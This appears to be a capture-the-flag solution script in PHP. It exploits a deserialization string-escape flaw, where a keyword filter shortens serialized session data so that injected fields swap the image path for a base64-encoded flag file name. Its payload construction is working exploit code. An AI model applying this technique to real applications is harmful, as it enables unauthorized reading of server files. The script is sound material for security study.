<?php
$_SESSION["user"]="";
$_SESSION["function"]='show_image';
$_SESSION["img"]='ZDBnM19mMWFnLnBocA==';
$a = serialize($_SESSION);
var_dump($a);
unset($_SESSION);

$_SESSION["user"] = 'guest';
$_SESSION['function'] = 'show_image';
$_SESSION['img'] = base64_encode('guest_img.png');

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}



$_SESSION["user"]="phpphpphpphpphpphpflag";
$_SESSION["function"]=';s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';
//$_SESSION["function"]=';s:8:"function";s:10:"show_image";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}';
$b = serialize($_SESSION);
$b = filter($b);
var_dump($b);
var_dump(unserialize($b));
